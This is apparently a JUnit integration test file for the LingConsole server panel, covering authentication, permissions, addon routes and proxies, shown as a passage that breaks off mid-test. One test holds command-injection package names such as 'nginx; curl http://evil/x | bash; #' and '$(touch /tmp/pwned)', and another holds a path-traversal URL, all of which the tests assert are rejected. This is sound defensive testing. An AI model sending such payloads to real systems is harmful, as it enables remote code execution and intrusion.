/*
 * LingConsole - A Server WebUI control panel
 * Copyright (C) 2026  XIAZHIRUI HUANG
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 * 
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
package im.xz.cn.lingconsole.app;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import im.xz.cn.lingconsole.app.panel.PanelConfig;
import im.xz.cn.lingconsole.app.panel.PanelServer;
import im.xz.cn.lingconsole.app.panel.model.User;
import im.xz.cn.lingconsole.app.panel.repository.DatabaseManager;
import im.xz.cn.lingconsole.app.panel.repository.RootAccountRepository;
import im.xz.cn.lingconsole.app.panel.repository.UserRepository;
import im.xz.cn.lingconsole.app.panel.service.UserService;
import im.xz.cn.lingconsole.common.model.UserRole;
import im.xz.cn.lingconsole.common.util.Argon2Util;
import im.xz.cn.lingconsole.common.util.IdUtil;
import im.xz.cn.lingconsole.daemon.DaemonApp;
import im.xz.cn.lingconsole.daemon.DaemonConfig;
import im.xz.cn.lingconsole.testutil.TestUtil;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;


class PanelIntegrationTest {

    private static final ObjectMapper MAPPER = new ObjectMapper();

    @TempDir
    static Path dataDir;

    static int panelPort;
    static int daemonPort;
    static DaemonApp daemonApp;
    static PanelServer panelServer;
    static DatabaseManager db;
    static String rootPw;
    static PanelConfig panelConfig;
    static DaemonConfig daemonConfig;
    static com.sun.net.httpserver.HttpServer proxyBackend;
    static int proxyBackendPort;
    static im.xz.cn.lingconsole.common.addon.AddonManager addonManager;
    static java.nio.file.Path addonsDir;

    static HttpClient http = HttpClient.newHttpClient();

    @BeforeAll
    static void setUp() throws Exception {
        daemonPort = TestUtil.freePort();
        panelPort = TestUtil.freePort();

        daemonConfig = TestUtil.writeDaemonConfig(dataDir, daemonPort);
        daemonApp = new DaemonApp(daemonConfig);
        daemonApp.start();

        
        proxyBackend = com.sun.net.httpserver.HttpServer.create(
                new java.net.InetSocketAddress("127.0.0.1", 0), 0);
        proxyBackend.createContext("/base", exchange -> {
            byte[] body = "{\"proxied\":true}".getBytes(java.nio.charset.StandardCharsets.UTF_8);
            exchange.getResponseHeaders().add("Content-Type", "application/json");
            exchange.getResponseHeaders().add("Set-Cookie", "pm_test=1; Path=/");
            exchange.sendResponseHeaders(201, body.length);
            exchange.getResponseBody().write(body);
            exchange.close();
        });
        proxyBackend.start();
        proxyBackendPort = proxyBackend.getAddress().getPort();

        panelConfig = TestUtil.writePanelConfig(dataDir, panelPort);
        db = new DatabaseManager(panelConfig.dbPath());
        
        UserService userService = new UserService(new UserRepository(db), new RootAccountRepository(db));
        rootPw = userService.firstLaunchInit();
        var proxyRegistry = new im.xz.cn.lingconsole.common.addon.AddonProxyRegistry();
        proxyRegistry.register("proxytest", "/tp", "http", "127.0.0.1", proxyBackendPort, "/base", null);
        addonsDir = dataDir.resolve("addons");
        Files.createDirectories(addonsDir);
        addonManager = new im.xz.cn.lingconsole.common.addon.AddonManager(addonsDir);
        panelServer = new PanelServer(panelConfig, db, daemonConfig, dataDir.toString(), false,
                new im.xz.cn.lingconsole.common.addon.AddonSocketRegistry(),
                new im.xz.cn.lingconsole.common.addon.AddonMenuRegistry(), proxyRegistry);
        panelServer.setAddonManager(addonManager);
        panelServer.start();
    }

    @AfterAll
    static void tearDown() {
        if (addonManager != null) {
            addonManager.disableAll();
        }
        if (proxyBackend != null) {
            proxyBackend.stop(0);
        }
        if (panelServer != null) {
            panelServer.stop();
        }
        if (daemonApp != null) {
            daemonApp.stop();
        }
        if (db != null) {
            db.close();
        }
    }

    
    
    

    private String login(String username, String password) throws Exception {
        String body = MAPPER.writeValueAsString(java.util.Map.of(
                "username", username, "password", password));
        HttpRequest req = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + "/api/auth/login"))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(body))
                .build();
        HttpResponse<String> resp = http.send(req, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, resp.statusCode());
        JsonNode node = MAPPER.readTree(resp.body());
        return node.path("data").path("token").asText();
    }

    private HttpResponse<String> apiGet(String path, String token) throws Exception {
        HttpRequest.Builder builder = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + path))
                .GET();
        if (token != null) {
            builder.header("X-LingConsole-Token", token);
        }
        return http.send(builder.build(), HttpResponse.BodyHandlers.ofString());
    }

    private HttpResponse<String> apiPost(String path, String token, String body) throws Exception {
        HttpRequest.Builder builder = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + path))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(body == null ? "" : body));
        if (token != null) {
            builder.header("X-LingConsole-Token", token);
        }
        return http.send(builder.build(), HttpResponse.BodyHandlers.ofString());
    }

    private HttpResponse<String> apiDelete(String path, String token) throws Exception {
        HttpRequest.Builder builder = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + path))
                .DELETE();
        if (token != null) {
            builder.header("X-LingConsole-Token", token);
        }
        return http.send(builder.build(), HttpResponse.BodyHandlers.ofString());
    }

    private String firstNodeId(String token) throws Exception {
        HttpResponse<String> resp = apiGet("/api/nodes", token);
        JsonNode node = MAPPER.readTree(resp.body());
        return node.path("data").get(0).path("id").asText();
    }

    
    
    

    @Test
    void unauthenticatedRequestRejected() throws Exception {
        HttpResponse<String> resp = apiGet("/api/nodes", null);
        assertEquals(401, resp.statusCode());
    }

    @Test
    void rootLoginAndMe() throws Exception {
        
        String body = MAPPER.writeValueAsString(java.util.Map.of("username", "ling", "password", rootPw));
        HttpRequest loginReq = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + "/api/auth/login"))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(body))
                .build();
        HttpResponse<String> loginResp = http.send(loginReq, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, loginResp.statusCode());
        String setCookie = loginResp.headers().firstValue("Set-Cookie").orElse("");
        assertTrue(setCookie.contains("HttpOnly"), "Cookie 应含 HttpOnly");
        assertTrue(setCookie.contains("SameSite=Strict"), "Cookie 应含 SameSite=Strict");

        String token = MAPPER.readTree(loginResp.body()).path("data").path("token").asText();
        HttpResponse<String> me = apiGet("/api/auth/me", token);
        assertEquals(200, me.statusCode());
        JsonNode user = MAPPER.readTree(me.body()).path("data").path("user");
        assertEquals("ling", user.path("username").asText());
        assertEquals(0, user.path("role").asInt());
    }

    @Test
    void passwordChangeRevokesAllSessions() throws Exception {
        
        String body = MAPPER.writeValueAsString(java.util.Map.of("username", "ling", "password", rootPw));
        String tokenA = MAPPER.readTree(http.send(HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + "/api/auth/login"))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(body)).build(), HttpResponse.BodyHandlers.ofString()).body())
                .path("data").path("token").asText();
        String tokenB = MAPPER.readTree(http.send(HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + "/api/auth/login"))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(body)).build(), HttpResponse.BodyHandlers.ofString()).body())
                .path("data").path("token").asText();

        
        String changeBody = MAPPER.writeValueAsString(java.util.Map.of(
                "oldPassword", rootPw, "newPassword", "new-root-pass-123"));
        HttpRequest changeReq = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + "/api/auth/password"))
                .header("X-LingConsole-Token", tokenB)
                .header("Content-Type", "application/json")
                .PUT(HttpRequest.BodyPublishers.ofString(changeBody))
                .build();
        HttpResponse<String> change = http.send(changeReq, HttpResponse.BodyHandlers.ofString());
        assertEquals(200, change.statusCode(), change.body());

        
        assertEquals(401, apiGet("/api/auth/me", tokenA).statusCode());
        assertEquals(401, apiGet("/api/auth/me", tokenB).statusCode());

        
        String newLoginBody = MAPPER.writeValueAsString(java.util.Map.of(
                "username", "ling", "password", "new-root-pass-123"));
        String newToken = MAPPER.readTree(http.send(HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + "/api/auth/login"))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(newLoginBody)).build(), HttpResponse.BodyHandlers.ofString()).body())
                .path("data").path("token").asText();
        String restoreBody = MAPPER.writeValueAsString(java.util.Map.of(
                "oldPassword", "new-root-pass-123", "newPassword", rootPw));
        HttpRequest restoreReq = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + "/api/auth/password"))
                .header("X-LingConsole-Token", newToken)
                .header("Content-Type", "application/json")
                .PUT(HttpRequest.BodyPublishers.ofString(restoreBody))
                .build();
        assertEquals(200, http.send(restoreReq, HttpResponse.BodyHandlers.ofString()).statusCode());
    }

    @Test
    void localDaemonAutoConnected() throws Exception {
        String token = login("ling", rootPw);
        HttpResponse<String> resp = apiGet("/api/nodes", token);
        JsonNode nodes = MAPPER.readTree(resp.body()).path("data");
        assertEquals(1, nodes.size());
        assertEquals(1, nodes.get(0).path("status").asInt(), "本地 Daemon 应在线");
    }

    @Test
    void appCreateAndListViaPanel() throws Exception {
        String token = login("ling", rootPw);
        String nodeId = firstNodeId(token);

        String command = System.getProperty("os.name").toLowerCase().contains("win")
                ? "ping -n 10 127.0.0.1" : "sleep 10";
        String createBody = "{\"id\":\"panelapp\",\"name\":\"panel-app\",\"command\":\"" + command + "\"}";
        HttpResponse<String> create = apiPost("/api/nodes/" + nodeId + "/apps", token, createBody);
        assertEquals(200, create.statusCode());
        JsonNode app = MAPPER.readTree(create.body()).path("data");
        String appId = app.path("id").asText();
        assertFalse(appId.isBlank());

        HttpResponse<String> list = apiGet("/api/nodes/" + nodeId + "/apps", token);
        assertEquals(200, list.statusCode());
        assertEquals(1, MAPPER.readTree(list.body()).path("data").size());

        
        HttpResponse<String> del = apiDelete("/api/nodes/" + nodeId + "/apps/" + appId, token);
        assertEquals(200, del.statusCode());
    }

    @Test
    void userRoleCannotManageNodes() throws Exception {
        
        UserRepository repo = new UserRepository(db);
        User user = new User();
        user.setId(IdUtil.uuid());
        user.setUsername("test-user");
        user.setPassword(Argon2Util.hash("user-password-123"));
        user.setRole(UserRole.NORMAL);
        user.setCreatedAt(System.currentTimeMillis() / 1000);
        user.setUpdatedAt(System.currentTimeMillis() / 1000);
        repo.insert(user);

        String token = login("test-user", "user-password-123");

        
        HttpResponse<String> list = apiGet("/api/nodes", token);
        assertEquals(403, list.statusCode());

        
        String body = "{\"name\":\"evil\",\"url\":\"ws://127.0.0.1:9999\",\"key\":\"x\"}";
        HttpResponse<String> create = apiPost("/api/nodes", token, body);
        assertEquals(403, create.statusCode());
    }

    @Test
    void nodeKeyNeverExposedInResponse() throws Exception {
        String token = login("ling", rootPw);
        HttpResponse<String> resp = apiGet("/api/nodes", token);
        assertEquals(200, resp.statusCode());
        JsonNode node = MAPPER.readTree(resp.body()).path("data").get(0);
        assertFalse(node.has("key"), "节点响应不应包含 key");
    }

    @Test
    void updateWithoutKeyPreservesExistingKey() throws Exception {
        String token = login("ling", rootPw);
        String nodeId = firstNodeId(token);
        
        HttpRequest req = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + "/api/nodes/" + nodeId))
                .header("X-LingConsole-Token", token)
                .header("Content-Type", "application/json")
                .PUT(HttpRequest.BodyPublishers.ofString(
                        "{\"name\":\"local-daemon\",\"url\":\"ws://127.0.0.1:" + daemonPort + "\"}"))
                .build();
        assertEquals(200, http.send(req, HttpResponse.BodyHandlers.ofString()).statusCode());
        
        HttpResponse<String> nodes = apiGet("/api/nodes", token);
        JsonNode node = MAPPER.readTree(nodes.body()).path("data").get(0);
        assertEquals(1, node.path("status").asInt(), "保留原 key 后节点应仍在线");
    }

    @Test
    void fileProxyWorksWithAuth() throws Exception {
        String token = login("ling", rootPw);
        String nodeId = firstNodeId(token);
        String dir = dataDir.resolve("panel-file-test").toString();
        String encDir = java.net.URLEncoder.encode(dir, java.nio.charset.StandardCharsets.UTF_8);

        HttpResponse<String> mkdir = apiPost("/api/nodes/" + nodeId + "/files/mkdir?path=" + encDir, token, null);
        assertEquals(200, mkdir.statusCode());

        String file = dir + "/note.txt";
        String writeBody = MAPPER.writeValueAsString(java.util.Map.of("path", file, "content", "panel test"));
        HttpResponse<String> write = apiPost("/api/nodes/" + nodeId + "/files/write", token, writeBody);
        assertEquals(200, write.statusCode());

        String encFile = java.net.URLEncoder.encode(file, java.nio.charset.StandardCharsets.UTF_8);
        HttpResponse<String> read = apiGet("/api/nodes/" + nodeId + "/files/read?path=" + encFile, token);
        assertEquals(200, read.statusCode());
        assertTrue(MAPPER.readTree(read.body()).path("data").path("content").asText().contains("panel test"));
    }

    @Test
    void monitorProxyWorks() throws Exception {
        String token = login("ling", rootPw);
        String nodeId = firstNodeId(token);
        HttpResponse<String> resp = apiGet("/api/nodes/" + nodeId + "/monitor", token);
        assertEquals(200, resp.statusCode());
        JsonNode data = MAPPER.readTree(resp.body()).path("data");
        assertTrue(data.path("memoryTotal").asLong() > 0);
    }

    @Test
    void loginLockoutAfterTooManyFailures() throws Exception {
        
        String body = "{\"username\":\"lockout-user\",\"password\":\"wrong\"}";
        for (int i = 0; i < 6; i++) {
            HttpRequest req = HttpRequest.newBuilder(
                            URI.create("http://127.0.0.1:" + panelPort + "/api/auth/login"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(body))
                    .build();
            HttpResponse<String> resp = http.send(req, HttpResponse.BodyHandlers.ofString());
            if (i < 5) {
                assertEquals(401, resp.statusCode(), "第 " + (i + 1) + " 次应为 401");
            } else {
                assertEquals(429, resp.statusCode(), "第 6 次应被锁定为 429");
            }
        }
    }

    @Test
    void reservedUsernamesRejectedAndTamperDisablesLogin() throws Exception {
        String token = login("ling", rootPw);

        for (String name : new String[]{"ling", "LING", "lingconsole", "LingConsole"}) {
            HttpResponse<String> resp = apiPost("/api/users", token,
                    "{\"username\":\"" + name + "\",\"password\":\"pass-123456\",\"role\":3}");
            assertEquals(400, resp.statusCode(), "保留用户名应拒绝: " + name);
            assertTrue(resp.body().contains("用户名已存在"), "应提示用户名已存在: " + name);
        }

        HttpResponse<String> ok = apiPost("/api/users", token,
                "{\"username\":\"normal-user\",\"password\":\"pass-123456\",\"role\":3}");
        assertEquals(200, ok.statusCode());
        String uid = MAPPER.readTree(ok.body()).path("data").path("id").asText();

        HttpRequest rename = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + "/api/users/" + uid))
                .header("X-LingConsole-Token", token)
                .header("Content-Type", "application/json")
                .PUT(HttpRequest.BodyPublishers.ofString("{\"username\":\"Ling\",\"role\":3}"))
                .build();
        assertEquals(400, http.send(rename, HttpResponse.BodyHandlers.ofString()).statusCode(),
                "不可将用户改名为保留用户名");

        User tamper = new User();
        tamper.setId("tamper-ling-" + System.currentTimeMillis());
        tamper.setUsername("Ling");
        tamper.setPassword(Argon2Util.hash("x"));
        tamper.setRole(UserRole.NORMAL);
        tamper.setCreatedAt(1);
        tamper.setUpdatedAt(1);
        UserRepository repo = new UserRepository(db);
        repo.insert(tamper);
        try {
            HttpResponse<String> blocked = apiPost("/api/auth/login", token,
                    "{\"username\":\"ling\",\"password\":\"" + rootPw + "\"}");
            assertEquals(403, blocked.statusCode(), "users 表存在 ling 时应禁用登录");
            assertTrue(blocked.body().contains("篡改"), "应提示数据库被篡改");
        } finally {
            repo.delete(tamper.getId());
        }
    }

    @Test
    void rootAssignsPermissionGroupGrantsKeys() throws Exception {
        String token = login("ling", rootPw);

        
        HttpResponse<String> created = apiPost("/api/permission-groups", token,
                "{\"groupId\":\"testops\",\"name\":\"test-ops\",\"permissions\":[\"lingconsole.system.status\",\"lingconsole.app.advanced\"]}");
        assertEquals(200, created.statusCode());
        String groupId = MAPPER.readTree(created.body()).path("data").path("id").asText();

        
        HttpResponse<String> u = apiPost("/api/users", token,
                "{\"username\":\"perm-user\",\"password\":\"perm-pass-123\",\"role\":3}");
        String userId = MAPPER.readTree(u.body()).path("data").path("id").asText();
        
        HttpRequest req = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort + "/api/users/" + userId + "/groups"))
                .header("X-LingConsole-Token", token)
                .header("Content-Type", "application/json")
                .PUT(HttpRequest.BodyPublishers.ofString("{\"groupIds\":[\"" + groupId + "\"]}"))
                .build();
        assertEquals(200, http.send(req, HttpResponse.BodyHandlers.ofString()).statusCode());

        
        String userToken = login("perm-user", "perm-pass-123");
        JsonNode me = MAPPER.readTree(apiGet("/api/auth/me", userToken).body()).path("data");
        assertTrue(me.path("permissions").toString().contains("lingconsole.system.status"));
        assertTrue(me.path("permissions").toString().contains("lingconsole.app.advanced"));
    }

    @Test
    void createUserWithGroupAssignment() throws Exception {
        String token = login("ling", rootPw);

        HttpResponse<String> grp = apiPost("/api/permission-groups", token,
                "{\"groupId\":\"creategrp\",\"name\":\"创建即分配\",\"permissions\":[\"lingconsole.system.status\"]}");
        assertEquals(200, grp.statusCode());
        String gid = MAPPER.readTree(grp.body()).path("data").path("id").asText();

        HttpResponse<String> created = apiPost("/api/users", token,
                "{\"username\":\"grp-user\",\"password\":\"grp-pass-123\",\"role\":3,\"groupIds\":[\"" + gid + "\"]}");
        assertEquals(200, created.statusCode());
        String uid = MAPPER.readTree(created.body()).path("data").path("id").asText();

        HttpResponse<String> perms = apiGet("/api/users/" + uid + "/permissions", token);
        JsonNode groups = MAPPER.readTree(perms.body()).path("data").path("groups");
        assertTrue(groups.toString().contains("创建即分配"), "创建用户时应直接分配权限组");

        String userToken = login("grp-user", "grp-pass-123");
        JsonNode me = MAPPER.readTree(apiGet("/api/auth/me", userToken).body()).path("data");
        assertTrue(me.path("permissions").toString().contains("lingconsole.system.status"),
                "新建用户应通过权限组获得权限");
    }

    @Test
    void nodeCustomIdAndPerNodePermissionKeys() throws Exception {
        String token = login("ling", rootPw);

        HttpResponse<String> bad = apiPost("/api/nodes", token,
                "{\"id\":\"Bad-ID\",\"name\":\"bad\",\"url\":\"ws://127.0.0.1:9999\",\"key\":\"x\"}");
        assertEquals(400, bad.statusCode(), "节点 ID 含非法字符应拒绝");

        HttpResponse<String> ok = apiPost("/api/nodes", token,
                "{\"id\":\"nodea1\",\"name\":\"节点A\",\"url\":\"ws://127.0.0.1:9999\",\"key\":\"x\"}");
        assertEquals(200, ok.statusCode(), "小写字母数字 id 应创建成功");

        HttpResponse<String> keys = apiGet("/api/permission-keys", token);
        assertEquals(200, keys.statusCode());
        String all = MAPPER.readTree(keys.body()).path("data").path("all").toString();
        assertTrue(all.contains("lingconsole.node.read.nodea1"), "应生成按节点的读权限键");
        assertTrue(all.contains("lingconsole.node.write.nodea1"), "应生成按节点的写权限键");
        assertTrue(all.contains("lingconsole.monitor.read.nodea1"), "应生成按节点的监控权限键");

        HttpResponse<String> del = apiDelete("/api/nodes/nodea1", token);
        assertEquals(200, del.statusCode());
    }

    @Test
    void addonMenusEndpointAuthenticated() throws Exception {
        String token = login("ling", rootPw);
        HttpResponse<String> resp = apiGet("/api/addons/menus", token);
        assertEquals(200, resp.statusCode());
        
        assertTrue(MAPPER.readTree(resp.body()).path("data").isArray());
    }

    @Test
    void addonDataServicePersists() throws Exception {
        var info = new im.xz.cn.lingconsole.addon.AddonInfo(
                "testdata", "1.0", "x", null, null, null, java.util.List.of());
        var ctx = new im.xz.cn.lingconsole.app.addon.AddonContextImpl(info,
                new im.xz.cn.lingconsole.common.addon.Slf4jAddonLogger("testdata"),
                panelServer.nodeService(), panelServer.userService(), panelServer.logService(),
                panelConfig, daemonConfig, dataDir,
                new im.xz.cn.lingconsole.common.addon.AddonSocketRegistry(),
                new im.xz.cn.lingconsole.common.addon.AddonMenuRegistry(), new im.xz.cn.lingconsole.common.addon.AddonProxyRegistry(), db,
                new im.xz.cn.lingconsole.common.command.ConsoleCommandDispatcher(), addonManager);

        ctx.data().put("k1", "v1");
        ctx.data().put("k2", "v2");
        assertEquals("v1", ctx.data().get("k1"));
        assertTrue(ctx.data().all().containsKey("k2"));
        ctx.data().delete("k1");
        assertFalse(ctx.data().all().containsKey("k1"));
    }

    @Test
    void addonCreateAppWorks() throws Exception {
        var info = new im.xz.cn.lingconsole.addon.AddonInfo(
                "testcreate", "1.0", "x", null, null, null, java.util.List.of());
        var ctx = new im.xz.cn.lingconsole.app.addon.AddonContextImpl(info,
                new im.xz.cn.lingconsole.common.addon.Slf4jAddonLogger("testcreate"),
                panelServer.nodeService(), panelServer.userService(), panelServer.logService(),
                panelConfig, daemonConfig, dataDir,
                new im.xz.cn.lingconsole.common.addon.AddonSocketRegistry(),
                new im.xz.cn.lingconsole.common.addon.AddonMenuRegistry(), new im.xz.cn.lingconsole.common.addon.AddonProxyRegistry(), db,
                new im.xz.cn.lingconsole.common.command.ConsoleCommandDispatcher(), addonManager);

        String nodeId = firstNodeId(login("ling", rootPw));
        String command = System.getProperty("os.name").toLowerCase().contains("win")
                ? "ping -n 5 127.0.0.1" : "sleep 5";
        Map<?, ?> created = ctx.apps().createApp(nodeId, "create-test-app", command,
                java.util.List.of(), null);
        assertNotNull(created, "createApp 应返回创建的应用");
        String appId = String.valueOf(created.get("id"));
        assertFalse(appId.isBlank());

        
        assertTrue(ctx.apps().listApps(nodeId).stream()
                .anyMatch(a -> appId.equals(a.get("id"))));

        
        ctx.apps().stopApp(nodeId, appId);
        java.net.http.HttpRequest del = java.net.http.HttpRequest.newBuilder(
                        URI.create("http://127.0.0.1:" + daemonPort + "/consoleapi/apps/" + appId))
                .header("X-LingConsole-Key", im.xz.cn.lingconsole.testutil.TestUtil.TEST_DAEMON_KEY)
                .DELETE()
                .build();
        http.send(del, java.net.http.HttpResponse.BodyHandlers.ofString());
    }

    @Test
    void panelProxyForwardsToBackend() throws Exception {
        String token = login("ling", rootPw);
        HttpResponse<String> resp = apiGet("/api/addon/proxytest/tp/hello?x=1", token);
        assertEquals(201, resp.statusCode());
        assertTrue(resp.body().contains("proxied"), "应转发后端响应体");
        assertTrue(resp.headers().firstValue("Content-Type").orElse("").contains("application/json"));
        assertTrue(resp.headers().firstValue("Set-Cookie").orElse("").contains("pm_test=1"),
                "应转发后端 Set-Cookie");

        // 反代默认权限 (permission.assign): user 角色应 403
        apiPost("/api/users", token, "{\"username\":\"proxy-user\",\"password\":\"proxy-pass-123\",\"role\":3}");
        String userToken = login("proxy-user", "proxy-pass-123");
        assertEquals(403, apiGet("/api/addon/proxytest/tp/hello", userToken).statusCode());
    }

    @Test
    void addonRoutePermissionGating() throws Exception {
        String src = """
                package authaddon;
                import im.xz.cn.lingconsole.addon.*;
                public class AuthAddon implements Addon {
                    public void onLoad(AddonContext ctx) {
                        ctx.registerPanelRoute(AddonRouteMethod.GET, "/public-test",
                            h -> h.json(java.util.Map.of("ok", true)), AddonContext.PUBLIC);
                        ctx.registerPanelRoute(AddonRouteMethod.GET, "/protected-test",
                            h -> h.json(java.util.Map.of("ok", true)));
                    }
                }
                """;
        Path jar = compileAddonJar("authaddon", "authaddon.AuthAddon", src);
        Files.copy(jar, addonsDir.resolve("authaddon.jar"),
                java.nio.file.StandardCopyOption.REPLACE_EXISTING);
        im.xz.cn.lingconsole.addon.AddonContextFactory factory = (info, logger) ->
                new im.xz.cn.lingconsole.app.addon.AddonContextImpl(info, logger,
                        panelServer.nodeService(), panelServer.userService(), panelServer.logService(),
                        panelConfig, daemonConfig, dataDir,
                        new im.xz.cn.lingconsole.common.addon.AddonSocketRegistry(),
                        new im.xz.cn.lingconsole.common.addon.AddonMenuRegistry(),
                        new im.xz.cn.lingconsole.common.addon.AddonProxyRegistry(), db,
                new im.xz.cn.lingconsole.common.command.ConsoleCommandDispatcher(), addonManager);
        addonManager.setContextFactory(factory);
        addonManager.loadAll(factory);
        addonManager.enableAll();

        String rootToken = login("ling", rootPw);
        assertEquals(200, apiGet("/api/addon/authaddon/public-test", rootToken).statusCode());
        assertEquals(200, apiGet("/api/addon/authaddon/protected-test", rootToken).statusCode());

        apiPost("/api/users", rootToken, "{\"username\":\"auth-user\",\"password\":\"auth-pass-123\",\"role\":3}");
        String userToken = login("auth-user", "auth-pass-123");
        assertEquals(200, apiGet("/api/addon/authaddon/public-test", userToken).statusCode());
        assertEquals(403, apiGet("/api/addon/authaddon/protected-test", userToken).statusCode());
    }

    @Test
    void addonPermissionSanitizationAndErrMarking() throws Exception {
        String src = """
                package permaddon;
                import im.xz.cn.lingconsole.addon.*;
                public class PermAddon implements Addon {
                    public void onLoad(AddonContext ctx) {
                        ctx.registerPermission("Manage", "管理");
                        ctx.registerPermission("ops.users", "操作用户");
                        ctx.registerPermission("非法节点", "非法");
                    }
                }
                """;
        Path jar = compileAddonJar("permaddon", "permaddon.PermAddon", src);
        Files.copy(jar, addonsDir.resolve("permaddon.jar"),
                java.nio.file.StandardCopyOption.REPLACE_EXISTING);
        addonManager.setContextFactory((info, logger) ->
                new im.xz.cn.lingconsole.app.addon.AddonContextImpl(info, logger,
                        panelServer.nodeService(), panelServer.userService(), panelServer.logService(),
                        panelConfig, daemonConfig, dataDir,
                        new im.xz.cn.lingconsole.common.addon.AddonSocketRegistry(),
                        new im.xz.cn.lingconsole.common.addon.AddonMenuRegistry(),
                        new im.xz.cn.lingconsole.common.addon.AddonProxyRegistry(), db,
                new im.xz.cn.lingconsole.common.command.ConsoleCommandDispatcher(), addonManager));
        addonManager.loadAll((info, logger) ->
                new im.xz.cn.lingconsole.app.addon.AddonContextImpl(info, logger,
                        panelServer.nodeService(), panelServer.userService(), panelServer.logService(),
                        panelConfig, daemonConfig, dataDir,
                        new im.xz.cn.lingconsole.common.addon.AddonSocketRegistry(),
                        new im.xz.cn.lingconsole.common.addon.AddonMenuRegistry(),
                        new im.xz.cn.lingconsole.common.addon.AddonProxyRegistry(), db,
                new im.xz.cn.lingconsole.common.command.ConsoleCommandDispatcher(), addonManager));
        addonManager.enableAll();

        var keys = im.xz.cn.lingconsole.common.permission.PluginPermissionRegistry.allKeys();
        assertTrue(keys.contains("permaddon.manage"), "大写 Manage 应被内部转小写注册为 manage");
        assertTrue(keys.contains("permaddon.ops.users"), "多段小写节点应正常注册");
        assertFalse(keys.contains("permaddon.非法节点"), "含非法字符的权限节点不得注册");

        var loaded = addonManager.byName("permaddon");
        assertTrue(loaded != null && loaded.state() == im.xz.cn.lingconsole.addon.AddonState.ERROR,
                "注册非法权限节点的插件应标记 ERR");
        assertTrue(loaded.error().contains("非法权限节点"), "错误信息应包含原因");

        
        addonManager.disableAll();
    }

    @Test
    void staticPathTraversalBlocked() throws Exception {
        java.nio.file.Path secret = dataDir.resolve("secret-static.txt");
        java.nio.file.Files.writeString(secret, "top-secret", java.nio.charset.StandardCharsets.UTF_8);

        HttpResponse<String> resp = http.send(HttpRequest.newBuilder(
                        URI.create("http://127.0.0.1:" + panelPort + "/static/../secret-static.txt"))
                .GET().build(),
                HttpResponse.BodyHandlers.ofString());
        assertEquals(404, resp.statusCode(), "路径遍历应被拒绝");
        assertFalse(resp.body().contains("top-secret"), "不得泄露静态目录之外的文件");

        HttpResponse<String> ok = http.send(HttpRequest.newBuilder(
                        URI.create("http://127.0.0.1:" + panelPort + "/static/js/app.js"))
                .GET().build(),
                HttpResponse.BodyHandlers.ofString());
        assertEquals(200, ok.statusCode(), "合法静态资源应正常返回");
    }

    @Test
    void packageNameCommandInjectionRejected() throws Exception {
        String token = login("ling", rootPw);
        String nodeId = firstNodeId(token);
        HttpResponse<String> resp = apiPost("/api/nodes/" + nodeId + "/packages/install", token,
                "{\"name\":\"nginx; curl http://evil/x | bash; #\"}");
        assertEquals(400, resp.statusCode(), "含 shell 元字符的包名应被拒绝");

        HttpResponse<String> remove = apiPost("/api/nodes/" + nodeId + "/packages/remove", token,
                "{\"name\":\"$(touch /tmp/pwned)\"}");
        assertEquals(400, remove.statusCode(), "命令替换注入应被拒绝");
    }

    @Test
    void runAsUserOnlyChangedByAdvanced() throws Exception {
        String token = login("ling", rootPw);
        String nodeId = firstNodeId(token);
        String command = System.getProperty("os.name").toLowerCase().contains("win")
                ? "ping -n 10 127.0.0.1" : "sleep 10";

        String createBody = "{\"id\":\"runasit\",\"name\":\"run-as\",\"command\":\"" + command + "\"}";
        assertEquals(200, apiPost("/api/nodes/" + nodeId + "/apps", token, createBody).statusCode());

        
        String advBody = "{\"name\":\"run-as\",\"command\":\"" + command + "\",\"runAsUser\":\"www-data\"}";
        HttpRequest adv = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort
                        + "/api/nodes/" + nodeId + "/apps/runasit/advanced"))
                .header("X-LingConsole-Token", token)
                .header("Content-Type", "application/json")
                .PUT(HttpRequest.BodyPublishers.ofString(advBody))
                .build();
        assertEquals(200, http.send(adv, HttpResponse.BodyHandlers.ofString()).statusCode());

